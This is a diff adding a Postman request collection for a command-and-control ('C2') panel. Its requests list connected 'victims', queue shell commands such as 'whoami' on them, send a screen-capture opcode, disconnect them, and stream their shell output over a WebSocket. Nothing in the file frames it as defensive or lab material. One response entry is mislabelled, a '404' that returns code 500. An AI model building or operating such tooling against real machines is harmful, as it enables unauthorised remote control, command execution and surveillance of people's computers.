@@ -1,0 +1,279 @@
+{
+  "info": {
+    "name": "C2 Control Panel",
+    "description": "REST API collection for the C2 Control Panel backend.\n\nSet the `base_url` variable to your server address (default: http://localhost:8080).\n\nFlow:\n1. Run Health Check to confirm server is up\n2. Connect a victim to :4444 via TCP\n3. Use List Victims to grab a victim `id`\n4. Set the `victim_id` variable and use the remaining requests",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://localhost:8080",
+      "type": "string"
+    },
+    {
+      "key": "victim_id",
+      "value": "",
+      "type": "string",
+      "description": "Paste a victim id from the List Victims response"
+    }
+  ],
+  "item": [
+    {
+      "name": "Health",
+      "item": [
+        {
+          "name": "Health Check",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/health",
+              "host": ["{{base_url}}"],
+              "path": ["health"]
+            },
+            "description": "Confirms the API server is running."
+          },
+          "response": [
+            {
+              "name": "200 OK",
+              "status": "OK",
+              "code": 200,
+              "body": "{\"status\":\"ok\"}"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Victims",
+      "item": [
+        {
+          "name": "List Victims",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "const data = pm.response.json();",
+                  "pm.test('Status 200', () => pm.response.to.have.status(200));",
+                  "pm.test('Response is array', () => pm.expect(data).to.be.an('array'));",
+                  "if (data.length > 0) {",
+                  "    pm.collectionVariables.set('victim_id', data[0].id);",
+                  "    console.log('victim_id set to:', data[0].id);",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/victims",
+              "host": ["{{base_url}}"],
+              "path": ["api", "victims"]
+            },
+            "description": "Returns all currently connected victims. Automatically sets `victim_id` collection variable from the first result."
+          },
+          "response": [
+            {
+              "name": "200 OK – victims present",
+              "status": "OK",
+              "code": 200,
+              "body": "[{\"id\":\"[::1]:41526\",\"info\":{\"hello\":\"hello\"},\"lastSeen\":\"2026-03-05T13:48:28Z\"}]"
+            },
+            {
+              "name": "200 OK – no victims",
+              "status": "OK",
+              "code": 200,
+              "body": "[]"
+            }
+          ]
+        },
+        {
+          "name": "Get Victim by ID",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Status 200 or 404', () => {",
+                  "    pm.expect(pm.response.code).to.be.oneOf([200, 404]);",
+                  "});",
+                  "if (pm.response.code === 200) {",
+                  "    const data = pm.response.json();",
+                  "    pm.test('Has id field', () => pm.expect(data).to.have.property('id'));",
+                  "}"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/victims/{{victim_id}}",
+              "host": ["{{base_url}}"],
+              "path": ["api", "victims", "{{victim_id}}"]
+            },
+            "description": "Fetch a single victim by their connection ID."
+          },
+          "response": [
+            {
+              "name": "200 OK",
+              "status": "OK",
+              "code": 200,
+              "body": "{\"id\":\"[::1]:41526\",\"info\":{\"hello\":\"hello\"},\"lastSeen\":\"2026-03-05T13:48:28Z\"}"
+            },
+            {
+              "name": "404 Not Found",
+              "status": "Not Found",
+              "code": 404,
+              "body": "{\"error\":\"victim not found\"}"
+            }
+          ]
+        },
+        {
+          "name": "Send Shell Command",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Status 200', () => pm.response.to.have.status(200));",
+                  "pm.test('Status is sent', () => {",
+                  "    const data = pm.response.json();",
+                  "    pm.expect(data.status).to.eql('sent');",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"whoami\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/victims/{{victim_id}}/command",
+              "host": ["{{base_url}}"],
+              "path": ["api", "victims", "{{victim_id}}", "command"]
+            },
+            "description": "Queues a shell command to be sent to the victim over the C2 TCP channel. Output is streamed back via WebSocket."
+          },
+          "response": [
+            {
+              "name": "200 OK",
+              "status": "OK",
+              "code": 200,
+              "body": "{\"status\":\"sent\"}"
+            },
+            {
+              "name": "404 Victim Not Found",
+              "status": "Not Found",
+              "code": 500,
+              "body": "{\"error\":\"victim not found\"}"
+            },
+            {
+              "name": "500 Queue Full",
+              "status": "Internal Server Error",
+              "code": 500,
+              "body": "{\"error\":\"command queue full\"}"
+            }
+          ]
+        },
+        {
+          "name": "Send Screen Start",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"\\u0010\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/victims/{{victim_id}}/command",
+              "host": ["{{base_url}}"],
+              "path": ["api", "victims", "{{victim_id}}", "command"]
+            },
+            "description": "Example showing a raw opcode can be sent. In practice use the dedicated opcode fields on the client."
+          }
+        },
+        {
+          "name": "Disconnect Victim",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Status 200', () => pm.response.to.have.status(200));",
+                  "pm.test('Status is disconnected', () => {",
+                  "    const data = pm.response.json();",
+                  "    pm.expect(data.status).to.eql('disconnected');",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "url": {
+              "raw": "{{base_url}}/api/victims/{{victim_id}}/disconnect",
+              "host": ["{{base_url}}"],
+              "path": ["api", "victims", "{{victim_id}}", "disconnect"]
+            },
+            "description": "Forcefully closes the TCP connection to the victim."
+          },
+          "response": [
+            {
+              "name": "200 OK",
+              "status": "OK",
+              "code": 200,
+              "body": "{\"status\":\"disconnected\"}"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "WebSocket",
+      "item": [
+        {
+          "name": "WS Connect (manual)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/ws",
+              "host": ["{{base_url}}"],
+              "path": ["ws"]
+            },
+            "description": "Use Postman's WebSocket request tab (not REST) to connect to ws://localhost:8080/ws.\n\nExpected real-time events:\n• {\"type\":\"victim_connected\",\"id\":\"...\"}\n• {\"type\":\"victim_disconnected\",\"id\":\"...\"}\n• {\"type\":\"shell_output\",\"id\":\"...\",\"output\":\"...\"}"
+          }
+        }
+      ]
+    }
+  ]
+}
